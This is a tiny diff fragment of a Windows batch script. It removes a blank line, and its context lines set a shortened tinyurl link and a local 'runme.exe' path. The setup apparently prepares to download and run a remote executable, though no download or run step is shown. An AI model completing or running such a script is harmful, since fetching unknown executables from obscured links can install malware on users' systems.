@@ -1,4 +1,3 @@
-
 @echo off
 set "url=https://tinyurl.com/4wvmcbbt"
 set "file=%~dp0runme.exe"
